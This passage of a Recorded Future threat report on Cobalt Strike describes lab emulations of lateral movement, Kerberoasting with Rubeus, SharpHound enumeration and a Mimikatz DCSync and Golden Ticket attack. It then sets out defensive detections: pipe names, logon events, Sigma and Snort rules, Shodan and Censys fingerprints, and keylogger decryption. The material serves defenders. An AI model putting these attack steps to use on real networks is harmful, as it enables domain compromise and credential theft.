(alice.lowpriv@testlab.\nlocal) logged onto the Windows 10 machine (WIN10CLI-01). The\nBeacon called out to a Cobalt Strike Team Server running on\nan attacking machine on the local network. The alice.lowpriv\naccount was a member of the Domain Users group and did not\nhave any local or domain administrative privileges.\n\nThe attacker had access to credentials for a further user\naccount, bob.mediumpriv@testlab.local (Valid Accounts: Domain\nAccounts, [T1078.002). We did not emulate the process of](https://attack.mitre.org/techniques/T1078/002/)\nobtaining these credentials, but there are numerous plausible\nscenarios for an attacker to possess them, such as prior\ncompromised credentials or files contained on an accessible\nSMB share within the network.\n\nThese credentials allowed the attacker to make an access\ntoken and effectively impersonate bob.mediumpriv using Cobalt\nStrike’s “make token” command. This account is also a member of\nthe Domain Users group and additionally has local administrative\nprivileges to another domain-joined system, a Windows 2019\nserver (FILESERVER). Although there are several tools to find\nwhich computers a user has local admin rights to, in this scenario,\nwe used the Find-LocalAdminAccess PowerShell function in the\nPowerSploit framework, which can be imported with Cobalt\nStrike’s “Powershell-import” command.\n\n\n-----\n\n_Figure 15: Cobalt Strike’s visualization of our chain of SMB Beacons (Source: Recorded Future)_\n\nHaving impersonated bob.mediumpriv, the attacker ran the\n“jump psexec64’’ command to move laterally to FILESERVER,\nspecifying that this new Beacon would connect to the initial\nBeacon on the WIN10CLI-01 system, via SMB. This led to the\nBeacon connecting from FILESERVER, running as the SYSTEM\nuser.\n\nUsing the built-in Cobalt Strike process listing command “ps”,\nthe attacker could see processes were running under the anne.\nadmin user account. The attacker was then able to steal a token\nfrom one of these processes, effectively now impersonating the\nanne.admin user. This user was in the “Domain Admins” group,\nand the attacker now had administrative access to the domain\ncontroller (DC01). The attacker moved laterally to this system\nusing WinRM and started a Beacon instance on the Domain\nController.\n\nThe end state of this emulation is illustrated here, where we\nsee the 3 Beacon instances, the users they are running under,\nand how they connect via SMB (the solid orange lines) before\negressing via HTTP (dashed green line) to the Team Server.\n\nFigure 18 shows a high-level report on all of the attacker\ncommands run during this scenario.\n\n\n**_Scenario 2: Kerberoasting Attack_**\n\nIn scenario 2, we emulate a Kerberoasting attack.\nKerberoasting allows an attacker with domain credentials to\nrequest a Kerberos ticket for a service account, encrypted with\nthe password hash for the account in question. If a weak password\nis chosen, an attacker can obtain the service account’s cleartext\npassword in an offline cracking attack. Service accounts are often\ngiven high-level privileges, sometimes including membership to\nthe Domain Admins group, making this an effective attack. We\ncreated a Windows service account (sql.server@testlab.local)\nwith an associated [Service Principal Name (SPN), required for](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)\nuse in Kerberos authentication.\n\nInteracting with a Beacon instance running as the alice.\nlowpriv user on the WIN10CLI-01 machine, we used the\nPowerShell Get-ADUser commandlet to return Active Directory\nusers with a value set for their SPN. With the SPN, we can now\nget the associated encrypted Kerberos TGS ticket using the\nRubeus tool, which is popular with penetration testers but has\nalso been [used by Ryuk ransomware operators. Using Rubeus](https://thedfirreport.com/2020/10/08/ryuks-return/)\nreturned the encrypted Kerberos TGS ticket for our SPN. The\nencrypted ticket can be cracked offline to obtain the cleartext\npassword for the service account.\n\n\n-----\n\n_Figure 16: Cobalt Strike activity report for lateral movement emulation (Source: Recorded Future)_\n\nTo further demonstrate Cobalt Strike’s in-memory execution,\nRubeus was run on the victim using the execute-assembly\ncommand, allowing a .NET assembly to be loaded into a\ntemporary process and run in memory, rather than having to\nupload a tool to the victim system.\n\n**_Scenario 3: AD Enumeration via SharpHound/BloodHound_**\n\nWe used the same execute-assembly command to run\nSharpHound on the victim network, again from the low-privilege\nDomain User account alice.lowpriv. [SharpHound is the official](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)\n“data collector” for the BloodHound AD visualization and\ngraphing tool. It uses native Windows API functions and LDAP\nnamespace functions to collect data from domain controllers and\ndomain-joined Windows systems. SharpHound outputs a zipped\nfile that we download; we then delete the local files. These files\nare then imported into the BloodHound application, producing\nthe following screenshot:\n\n\n**_Scenario 4: Mimikatz and DCSync_**\n\nIn our final emulation, we used features of Mimikatz (via\nthe Cobalt Strike GUI) to dump credentials using a DCSync (OS\n[Credential Dumping: DCSync, T1003.006) attack. We launched](https://attack.mitre.org/techniques/T1003/006/)\nthis from a Beacon running in a high integrity context as the\nanne.admin user (obtained in scenario 1), since this attack\nrequires domain replication rights (which our user has due to\ntheir membership of the Domain Admins group). Again leveraging\nMimikatz but using the Cobalt Strike GUI commands, we then\ncreated a “Golden Ticket” (Steal or Forge Kerberos Tickets:\nGolden Ticket, [T1158.001), using the KRBTGT user NTLM hash](https://attack.mitre.org/techniques/T1558/001/)\nobtained in our DCSync attack.\n\n\n-----\n\n_Figure 17: Rubeus run from Beacon to perform a Kerberoasting attack (Source: Recorded Future)_\n\n_Figure 18: BloodHound visualization and graph of our simple testlab Domain (Source: Recorded Future)_\n\n\n-----\n\n_Figure 19: Cobalt Strike’s GUI makes it simple to create a Golden Ticket, even pre-populating some_\n_of these fields (Source: Recorded Future)_\n\n##### Detection Techniques\n\n**_Named Pipes_**\n\nCobalt Strike relies extensively on [named pipes for AV](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes#:~:text=A%20named%20pipe%20is%20a,one%20or%20more%20pipe%20clients.&text=Named%20pipes%20can%20be%20used,different%20computers%20across%20a%20network.)\nevasion, lateral movement, inter-Beacon communication, and\npost-exploitation activity. Named pipes are a method of interprocess communication in Windows, used primarily for local\nprocesses to communicate. They can also be used for processes\n[to communicate between hosts. A blog by the creator of Cobalt](https://blog.cobaltstrike.com/2021/02/09/learn-pipe-fitting-for-all-of-your-offense-projects/)\nStrike gives an overview of the different purposes Cobalt Strike\nuses named pipes for and provides guidance to operators on\nopsec considerations. As with many features of Cobalt Strike,\noperators are encouraged to change the default values of the\nnamed pipes, but compliance with this recommendation is\nunlikely to be universal.\n\nIn logs from our emulation lab, we can see evidence of Cobalt\nStrike’s default pipe names. The following logs were captured\nfrom the FILESERVER machine after lateral movement from the\nWindows 10 client.\n\n_Figure 20: Sysmon Log Events showing Cobalt Strike’s default SMB Beacon pipe name (Source:_\n_Recorded Future)_\n\n_Figure 21: Sysmon Log Events showing Cobalt Strike’s default pipe name for executing binaries_\n_(Source: Recorded Future)_\n\n\nNote the “msagent-xx” and “MSSE-xxx-server” default pipe\nnames: the former is used for communication between SMB\nBeacons, and the latter is used in Cobalt Strike’s default EXE\nand DLL binaries as a means to inject shellcode. We can also\nobserve the randomly named service executable written to the\nlateral movement target’s ADMIN$ SMB share.\n\nThe “msagent” pipe name can be trivially changed in the\nCobalt Strike interface while establishing an SMB Beacon\nlistener; the MSSE pipe name requires use of the Artifact Kit\nto change, which requires a separate download and is absent\nfrom at least some cracked versions of Cobalt Strike, and may\ntherefore be a more reliable detection. Again, while both names\nare configurable, attackers will not always observe best practice:\na 2018 [campaign attributed to APT29 dropped a Cobalt Strike](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html)\nBeacon from a malicious .LNK file, and in this campaign both\nthe MSSE and msagent pipe names were unchanged from their\ndefaults, despite the attacker’s having observed some tradecraft\nin using a modified version of a malleable C2 profile.\n\n[A Sigma rule from Florian Roth and Wojciech Lesicki can be](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/sysmon_mal_cobaltstrike.yml)\nused to detect these (and several other) default pipe naming\npatterns used in Cobalt Strike. It is worth noting the Sysmon\nevents 17 and 18 are not logged in the popular SwiftOnSecurity\nSysmon [configuration. As mentioned previously, we used the](https://github.com/SwiftOnSecurity/sysmon-config)\nconfiguration from a recent GitHub [pull request in our test lab](https://github.com/SwiftOnSecurity/sysmon-config/pull/151)\nto capture these events. As always, any Sysmon configuration\nshould be checked and tailored before being deployed in\nproduction. Further content on Cobalt Strike’s use of named\npipes, and detections built on these, can be found in blogs from\n[F-Secure and Sekoia.](https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/)\n\n**_Abnormal Login Events_**\n\nLateral movement using Cobalt Strike (and other offensive\ntools) can also generate abnormal Windows login events. One\nexample of a detection strategy would be to look for event ID\n[4624 (An Account was Successfully Logged On) in the Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)\nSecurity log, with a LogonType value of 9 (NewCredentials — A\ncaller cloned its current token and specified new credentials for\noutbound connections, and the new logon session has the same\nlocal identity, but uses different credentials for other network\nconnections). This was again captured in our emulation lab:\n\n\n-----\n\n_Figure 22: Security Log event showing unusual LogonType (Source: Recorded Future)_\n\nThis detection approach is better suited to threat hunting.\nIt may generate false positives (for example, legitimate remote\nadministration activity), but they will likely be rare enough in\nmost environments to conduct further investigation.\n\n**_Rundll32 Sacrificial Process_**\n\n[In some of our tests, this Sigma rule was effective at finding](https://github.com/SigmaHQ/sigma/blob/0fcbce993288f993e626494a50dad15fc26c8a0c/rules/windows/process_creation/win_bad_opsec_sacrificial_processes.yml)\nrundll32.exe processes that are spawned without process\narguments. By default, the Cobalt Strike lateral movement\ncommands “jump psexec” and “jump psexec64” and the privilege\nescalation command “elevate svc-exe” generate a Windows\nservice executable and upload it to the target. This executable\nspawns rundll32.exe with no arguments, injects a process into\nit, and then exits. Rundll32.exe typically takes a DLL name\nand entry function as arguments, so this behavior from Cobalt\n[Strike is anomalous. Once again, Cobalt Strike’s documentation](https://www.cobaltstrike.com/help-opsec)\nrecommends operators change this default behavior, but not all\noperators will do so.\n\n\n#### Network-Based Detections\n\n##### Team Server Detection\n\nInsikt Group’s primary detection methods for Cobalt Strike\nfocus on identifying the Team Servers. As outlined in previous\n[Insikt research, there are publicly reported methods for](https://www.recordedfuture.com/cobalt-strike-servers/)\nidentifying Cobalt Strike Team Servers:\n\n  - Cobalt Strike servers are shipped with a default security\n\ncertificate that can be used to fingerprint them unless\nthe administrator changes it.\n\n  - When enabled, the Cobalt Strike DNS server responds to\n\nany DNS request received with a bogus (fake) IP: 0.0.0.0\n(this is not unique to Cobalt Strike servers).\n\n  - The default controller port for Cobalt Strike Team Server\n\nis 50050/TCP, a port unlikely to be found open on other\nservers.\n\n  - The “404 Not Found” HTTP response for Cobalt Strike is\n\nunique to NanoHTTPD web servers and can be detected.\n\n  - There is an extra null byte in the HTTP server response\n\nof NanoHTTPD servers (an open source, Java-based\nweb server). This extra null byte is visible in Cobalt\nStrike version 3.13 and earlier, including in many cracked\ninstances.\n\n\n-----\n\n[An additional public detection method for Cobalt](https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a)\nStrike Team Servers released after our initial research\nshows that by using the [JARM signature 07d14d16d21d](https://github.com/salesforce/jarm)\n21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1,\nyou can significantly filter down the public IP space to find a\nmanageable amount of suspicious Cobalt Strike Team Servers.\n\nThe use of a proxy server for the Cobalt Strike Team Server\nprevents detection with many of these techniques, including\nsoftware-focused detections such as the default security\ncertificate, 404 response and NanoHTTPD null byte methods.\nHowever, many operators of Cobalt Strike do not take this\nimportant step.\n\nAlthough the detection methodologies described above are\npublic, Recorded Future has observed that Cobalt Strike servers\nhave been left unpatched for the most part, allowing fingerprinting\nand subsequent detection. This methodology, coupled with other\ndetections, allowed Recorded Future to sample Cobalt Strike\nservers found in the wild and compare fingerprinting methods\nto help defenders best track and monitor this framework. The\ntracking of Cobalt Strike servers can aid blue teams in detecting\nred team activity and containing activity from adversaries who\nhave not modified their Cobalt Strike Team Server.\n\nBelow are the passive searches that detect Cobalt Strike\nTeam Servers using the above-mentioned techniques.\n\n**_Shodan_**\n\n  - [Searching Shodan for ssl.cert.serial:146473198 will](https://www.shodan.io/search?query=ssl.cert.serial%3A146473198)\n\nidentify servers making use of the default SSL certificate,\nbased on the certificate’s serial number. This is a higher\nconfidence signal.\n\n  - [Searching Shodan for product:cobalt will parse Shodan’s](https://www.shodan.io/search?query=product%3Acobalt)\n\ndataset for the extra space in HTTP and HTTPS header\nresponses. Due to this rough search, we consider this a\nlow to moderate confidence signal.\n\n  - [Searching Shodan for port:50050 will surface servers](https://www.shodan.io/search?query=port%3A50050)\n\nwith the Cobalt Strike controller port, 50050 open,\nanother low confidence signal that must be corroborated\nwith other data.\n\n  - [Searching Shodan section for HTTP headers without the](https://www.shodan.io/search?query=%22HTTP%2F1.1+404+Not+Found+Date%3A+%22+%22Content-Type%3A+text%2Fplain+Content-Length%3A+0%22+-Server+-Connection+-Expires+-Access-Control+-Set-Cookie+-Content-Encoding+-Charset&page=1)\n\nextra space.\n\n  - [Searching Shodan for the JARM signature, 07d14d16d21d](https://www.shodan.io/search?query=ssl.jarm%3A07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1)\n\n21d07c42d41d00041d24a458a375ee\nf0c576d23a7bab9a9fb1 (note, this returns IPs that could\nbe associated with Team Servers. Additional analysis is\nneeded to positively identify Team Servers).\n\n\n**_Censys_**\n\n  - [Searching Censys for 443.https.tls.certificate.parsed.](https://censys.io/ipv4?q=443.https.tls.certificate.parsed.fingerprint_sha256%3A+87f2085c32b6a2cc709b365f55873e207a9caa10bffecf2fd16d3cf9d94d390c)\n\nfingerprint_sha256: 87f2085c32b6a2cc709b365f55\n873e207a9caa10bffecf2fd16d3cf9d94d390c finds IPs\nmaking use of the Cobalt Strike certificate, based on its\nSHA256 fingerprint. This is a higher confidence signal.\n\n**_Recorded Future_**\n\n[• Recorded Future detected 3303 unaltered Cobalt Strike](https://www.recordedfuture.com/cobalt-strike-servers/)\n\n[Team Servers (the pre-configured TLS certificate, Team](https://blog.cobaltstrike.com/2019/02/19/cobalt-strike-team-server-population-study/)\n[Server administration port, or telltale HTTP headers)](https://www.x33fcon.com/archive/2019/slides/x33fcon19_Hunting_Beacons_Bartek.pdf)\nduring 2020, the most popular C2 framework observed in\nour dataset. Cobalt Strike represented 13.5% of the total\nC2 servers identified.\n\n**_InQuest_**\n\nBased on our analysis of the Cobalt Strike macro, Insikt\n[Group developed a Python script to search InQuest data for the](https://github.com/Insikt-Group/Research/blob/master/CobaltStrike/CobaltStrike_Macro_InQuestLabs.py)\n“rwxpage” keyword and then extract the shellcode portion of\nthe macro to get the configured Team Server C2 information.\nDefenders can use this script to extract Team Servers IPs and\ndomains that can be added to a blocklist or used in historical\nsearches in your SIEM.\n\n##### Cobalt Strike Beacon Traffic Detection\n\nCobalt Strike Beacon is highly customizable. From a traffic\nstandpoint, it is difficult to account for all possible Beacon\noptions. However, many threat actors using Beacon do not\ncustomize it sufficiently to avoid detection.\n\nAn example is the default Beacon check-in period. By default,\nBeacon will check in with its C2 server on exact [60-second](https://www.cobaltstrike.com/help-beacon)\n[intervals. This can be changed using the Beacon sleep command](https://www.cobaltstrike.com/help-beacon)\nto alter the time frequency and add a “jitter” which changes the\nintervals to be less regular. But not all actors do so, or do so in a\nmanner where a regular beacon is still clearly observable.\n\n\n-----\n\n_Figure 23: Cobalt Strike Beacon traffic with default 60-second interval (Source: Recorded Future)_\n\nAs this image illustrates, the Cobalt Strike Beacon can be\nvery noisy.\n\nFor those organizations that can monitor HTTPS traffic, there\nare several detection possibilities, including alerting off of known\nCobalt Strike Beacon URLs and HTTP header details such as\nReferers and User-Agents.\n\nOne default configuration that could be used as a network\ndetection for the Cobalt Strike Beacon module is the URL string\n“/submit.php?id=[9-10 digit string]”. This string is observable in\nHTTP POST communications when using some cracked versions\nof Cobalt Strike, which may not include all of the bells and\nwhistles of a licensed version. Insikt Group has created a Snort\nIDS detection for variations of this URL string.\n\n\n_Figure 24: Snort IDS detection for Cobalt Strike POST Tasking (Source: Recorded Future)_\n\nMany Cobalt Strike operators, however, are aware of the\nlimitations of the default Beacon settings and do customize\nthem. One of the common ways of attempting to avoid detection\nis by integrating Malleable C2 profiles with Beacon. Originally\n[introduced in 2014, Malleable C2 profiles allow for greater](https://blog.cobaltstrike.com/2014/07/16/malleable-command-and-control/)\nflexibility in how Beacon connects with its C2 server. The\nMalleable C2 profiles allow Beacon to mimic a wide array of\nsystems and devices and communicate with its C2 with various\nmethods to remain undetected.\n\n\n_Figure 25: Telltale default Cobalt Strike Beacon POST with “/submit php?id [9 10 digits]” string visible (Source: Recorded Future)_\n\n\n-----\n\n_Figure 26: Breakdown of Malleable C2 profiles by host system in User-Agent string (Source: Recorded Future)_\n\n\nCobalt Strike provides [some Malleable C2 profiles on their](https://github.com/Cobalt-Strike/Malleable-C2-Profiles)\nGitHub page. These “default” profiles are used by some Cobalt\nStrike operators, and many profiles produce what would now be\nconsidered unusual traffic, such as mimicry of a Windows 2000\nsystem. Many profiles contain specific SSL settings that can be\ndetected. Some of the Malleable C2 profiles also contain very\nuncommon User-Agents, for example “Mozilla/4.0 (Windows 7\n6.1) Java/1.7.0_11 “. Such a User-Agent is rarely seen on a modern\nenterprise network. Creating alerts for such unlikely User-Agents,\nespecially when combined with other detection mechanisms, can\nprovide early warning indications of Cobalt Strike activity on a\nnetwork.\n\nThe complementary [Malleable-C2-Randomizer](https://github.com/bluscreenofjeff/Malleable-C2-Randomizer) code\navailable on GitHub allows for substitution of metadata to\nrender pure string detection of the profiles ineffective. As the\nprofiles created are now dated to 2017, there are also anomalies\ngenerated when a Cobalt Strike operator uses these randomized\n[profiles. In 2020, FortyNorthSecurity released the C2concealer](https://fortynorthsecurity.com/blog/introducing-c2concealer/)\nsoftware on GitHub. This command-line tool generates Malleable\nC2 profiles for use with Cobalt Strike, allowing for alteration\nand substitution of various strings to circumvent string-based\ndetection signatures. Recorded Future has observed C2concealer\n\n\nbeing used by financially motivated Cobalt Strike operators. As\nwith other Malleable C2 profiles found on GitHub, the defaults\nstill provide detection opportunities, as there are a finite number\nof attributes; there are only 8 User-Agent options provided in the\nGitHub code. These include outdated operating systems.\n\nInsikt Group undertook an examination of the common\nMalleable C2 profiles, analyzing 60 standard Malleable C2\nprofiles, Malleable-C2-Randomizer profiles, and C2concealer\nprofiles. The number of unique strings is less, as several\nMalleable C2 profiles use the same strings as others.\n\nAlthough there are other attributes of the profiles that can\nbe examined, we focused on the User-Agent strings within the\nprofiles as a key indicator.\n\nAn examination of the operating systems defined in the UserAgents of these Cobalt Strike profiles showed that 45% identify\nthe source host as a Windows 7 system; another 15% of the\nprofiles identify as Windows 2000, Vista, or XP. If an organization\nis no longer operating these legacy Windows systems on their\nnetwork, alert logic for traffic as defined by User-Agents for such\nsystems can be created. Other outdated operating systems,\nincluding OS X 10.11 and Android 6, both released in 2015, are\nalso found in the profiles.\n\n\n-----\n\n_Figure 27: Breakdown of Malleable C2 profiles by browser version in user-agent string (Source: Recorded Future)_\n\n\nSimilarly, a review of the browser versions used in these\ncommon Malleable C2 profiles showed that these often mimic\nvery old versions of browser software. Although some of the\nprofiles either use a non-browser User-Agent or do not identify\nthe browser, 25% of them use Internet Explorer 10 or earlier\nversions (replaced in 2013 by version 11). Over 30% use versions\nof Firefox, Chrome or Safari that were released in 2016 or before.\nAlthough some users on a corporate network may be using\noutdated browsers, a Malleable C2 profile using one of these\nUser-Agents should be unusual if not unique on a network.\n\nIn summary, old and outdated versions of operating systems\nand software are common in Cobalt Strike Malleable C2 UserAgents available on GitHub. Some attackers will have addressed\nthis problem, but many go the easy route and use Malleable\nC2 profiles that have already been written. The use of these\nprofiles presents the network defender with opportunities to\ndetect those attackers.\n\n#### Advanced Detection and Automation\n\nMany detections and analysis techniques have been shared\nwith the community for Cobalt Strike in the past few months. In\nthe [SigmaHQ GitHub repository, there are currently 18 Cobalt](https://github.com/SigmaHQ/sigma/search?q=Cobalt+Strike)\nStrike-related rules. In addition to IDS rules developed during\nour research, there are numerous Cobalt Strike SNORT rules\n[available here.](https://www.snort.org/search?query=Cobalt+Strike&submit_search=)\n\n\nAdditionally, analysis tools geared towards helping analysts\nexamine Cobalt Strike activity post-detection provide additional\ninsights and context to their response and analysis phases. Such\ntools include:\n\n1. [Sentinel-One’s Beacon Parser to extract configuration](https://github.com/Sentinel-One/CobaltStrikeParser)\n\nfrom a Beacon\n\n2. [Diddier Stevens tool to decrypt Cobalt Strike traffic](https://blog.didierstevens.com/2021/04/26/quickpost-decrypting-cobalt-strike-traffic/)\n\n3. [NCC Groups tool to assist in decrypting Cobalt Strike](https://github.com/nccgroup/pybeacon)\n\ntraffic\n\nIn addition to the above tools, there are multi-functional\ntoolsets aimed at analyzing Beacons and interacting with a live\nTeam Server, such as:\n\n1. [RomanEmelyanov CobaltStrikeForensic](https://github.com/RomanEmelyanov/CobaltStrikeForensic)\n\n2. [Te-k - Cobalt Strike Resources](https://github.com/Te-k/cobaltstrike)\n\nA walkthrough of JARM scanning and Beacon extracting\n[using Te-k resources can be found here, Analyzing Cobalt Strike](https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/)\n[for Fun and Profit.](https://www.randhome.io/blog/2020/12/20/analyzing-cobalt-strike-for-fun-and-profit/)\n\nWith so many detections and tools available, it is sometimes\ndifficult to craft an effective response. We have outlined 2\nscenarios below to demonstrate an application of detection\nengineering, response, and automation.\n\n\n-----\n\n_Figure 28: Cobalt Strike Keylogger detection and response workflow (Source: Recorded Future)_\n\n\n-----\n\n##### Cobalt Strike Keylogger Detection and Response\n\nThe workflow in Figure 30 details the detection and response\nof keylogging activity by Cobalt Strike. However, this may be\nreused for different types of Cobalt Strike tasking. This workflow\nuses our IDS rule “Cobalt_Strike_Tasking_POST’’ for the initial\ndetection and then combines the research efforts of Didier\nStevens and NCC group to decrypt the Keylogger traffic.\n\n##### Cobalt Strike Keylogger Detection\n\nThe detection section is dependent on your visibility and\nconfiguration of your SIEM and IDS. In this scenario, the IDS alert\nfrom our rule “Cobalt_Strike_Tasking_POST” is sent to the SIEM,\nwhich initiates the automated response actions.\n\n_[Figure 29: Cobalt Strike Keylogger Detection (Source: Recorded Future)](https://app.recordedfuture.com/live/sc/pkfrZfwWUlMI)_\n\n##### Cobalt Strike Keylogger Response and Automation\n\nThe response/automation section requires the ability to\nautomatically execute tools including a Python script and retrieve\nthe results from your endpoint(s); most Endpoint Detection and\nResponse tools provide this capability. Built-in Windows tools\nsuch as PowerShell can also be used if the response team has\nsufficient privileges.\n\n_[Figure 30: Cobalt Strike Keylogger Response and Automation (Source: Recorded Future)](https://app.recordedfuture.com/live/sc/pkfrZfwWUlMI)_\n\n\nOnce a Cobalt Strike alert is received, the priority should\nbe to identify what keylogging activity has been captured. To\ninspect the keylogging activity the encrypted keystrokes need to\nbe decrypted. The decryption process requires a memory dump\nof the Cobalt Strike Beacon process and a collection of network\ntraffic containing the encrypted keystroke. This process can be\nautomated if SOAR capabilities exist, but can also be performed\nmanually.\n\nTo create a memory dump of the Cobalt Strike Beacon\n[process, you can use a tool like ProcDump with the command seen](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)\nin Figure 33. Some EDR solutions will include this functionality.\n\nprocdump.exe -mp -s 2 -n 20 <process name or pid>\n\n_Figure 31: ProcDump command needed to generate a memory dump of a Cobalt Strike Beacon_\n_[Process (Source: Recorded Future)](https://app.recordedfuture.com/live/sc/pkfrZfwWUlMI)_\n\nThe next objective will be to collect the network\ncommunications and attempt to extract the AES keys from\nthe memory dump and decrypt the keystrokes. Sources of\nnetwork communication will vary depending on your toolsets,\norganizations with full-packet capture technologies can use\nthose toolsets, additionally, setting your IDS to log the traffic\nassociated with alerts can also provide the needed network\ncommunication. These steps are best done automatically if such\ncapability exists.\n\nThe steps for this objective are as follows:\n\n1. Collect network traffic (IDS, Networking Tools)\n\n[2. Run the Insikt Group Python script “CobaltStrike_](https://github.com/Insikt-Group/Research/blob/master/CobaltStrike/CobaltStrike_Keylogger_Decryptor.py)\n\n[Keylogger_Decryptor” to decrypt and extract keylogger](https://github.com/Insikt-Group/Research/blob/master/CobaltStrike/CobaltStrike_Keylogger_Decryptor.py)\ndata\n\nThe Insikt Group Python script mentioned above combines\nthe research of Didier Stevens and NCC group to extract the\nAES key from the memory dump and decrypt the payload from a\nsupplied PCAP. Figure 34 shows the resulting output.\n\n\n-----\n\n_Figure 32: Cobalt Strike Keylogger Decoder Output (Source: Recorded Future)_\n\n##### Cobalt Strike Keylogger Containment, Analysis, and Eradication\n\nAt this stage in the response, an analyst now has a good\nunderstanding of the depth of the incident and can follow\ndocumented procedures for containment, eradication, and\nclosure.\n\n_Figure 33: Cobalt Strike keylogger containment/analysis/eradication (Source: Recorded Future)_\n\n##### Cobalt Strike C2 Blocking\n\nRecorded Future uses the methods described in the Team\nServer Detection section as well as private sources to identify\nCobalt Strike Team Servers. Our Team Server C2s are maintained\nin our Command and Control list. Adding our Command and\nControl list as a blocklist to your proxy or firewall can proactively\nblock Cobalt Strike communication back to the Team Server.\n\n\nWhile this would not block the initial infection vector, like a\nphishing email or HTML Application (HTA), it would prevent the\nfirst stage from communicating to its Team Server to download\nthe second stage Beacon. This workflow is depicted in Figure\n36 below.\n\n_Figure 34: Cobalt Strike Team Server Block List (Source: Recorded Future)_\n\n\n-----\n\n#### Outlook\n\nBased on the rise of interest in Cobalt Strike on underground\nforums, the continued development of the Cobalt Strike\nframework, and the size of the existing user base, Cobalt Strike\nwill continue to be a threat in the future. References to threat\nactors attempting to acquire Cobalt Strike on the dark web\n[have increased significantly in the past year. Cobalt Strike has](https://app.recordedfuture.com/live/sc/pkfrZfwWUlMI)\nreleased new versions with large feature updates on a [regular](https://www.cobaltstrike.com/releasenotes.txt)\n[basis, with no signs of slowing down. Finally, Insikt Group tracks](https://www.cobaltstrike.com/releasenotes.txt)\na large number of Cobalt Strike-related projects released by the\nbroader security research community. This level of free support\nand investment in the tool will likely make it a strong candidate\nfor a large variety of threat actors to make use of.\n\n\n-----\n\nAbout Recorded Future\n\nRecorded Future is the world’s largest provider of intelligence for enterprise\n\nsecurity. By combining persistent and pervasive automated data collection and analytics\n\nwith human analysis, Recorded Future delivers intelligence that is timely, accurate,\n\nand actionable. In a world of ever-increasing chaos and uncertainty, Recorded Future\n\nempowers organizations with the visibility they need to identify and detect threats\n\nfaster; take proactive action to disrupt adversaries; and protect their people, systems,\n\nand assets, so business can be conducted with confidence. Recorded Future is trusted\n\nby more than 1,000 businesses and government organizations around the world.\n\nLearn more at recordedfuture.com and follow us on Twitter at @RecordedFuture.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://go.recordedfuture.com/hubfs/reports/mtp-2021-0914.pdf"
    ],
    "report_names": [
        "mtp-2021-0914.pdf"
    ],
    "threat_actors": [
        {
            "id": "873a6c6f-a4d1-49b3-8142-4a147d4288ef",
            "created_at": "2022-10-25T16:07:23.455744Z",
            "updated_at": "2025-03-27T02:02:09.811933Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Operation Skeleton Key"
            ],
            "source_name": "ETDA:Chimera",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "SkeletonKeyInjector",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3c864b3-fac9-4d56-8500-7c06c829fbf8",
            "created_at": "2023-01-06T13:46:39.071873Z",
            "updated_at": "2025-03-27T02:00:02.990045Z",
            "deleted_at": null,
            "main_name": "TA2101",
            "aliases": [
                "Storm-0216",
                "DEV-0216",
                "UNC2198",
                "Maze Team",
                "TWISTED SPIDER",
                "GOLD VILLAGE"
            ],
            "source_name": "MISPGALAXY:TA2101",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f88b16bc-df4b-48e7-ae35-f4117240ff24",
            "created_at": "2022-10-25T15:50:23.556699Z",
            "updated_at": "2025-03-27T02:00:55.499173Z",
            "deleted_at": null,
            "main_name": "Chimera",
            "aliases": [
                "Chimera"
            ],
            "source_name": "MITRE:Chimera",
            "tools": [
                "PsExec",
                "esentutl",
                "Mimikatz",
                "Cobalt Strike"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
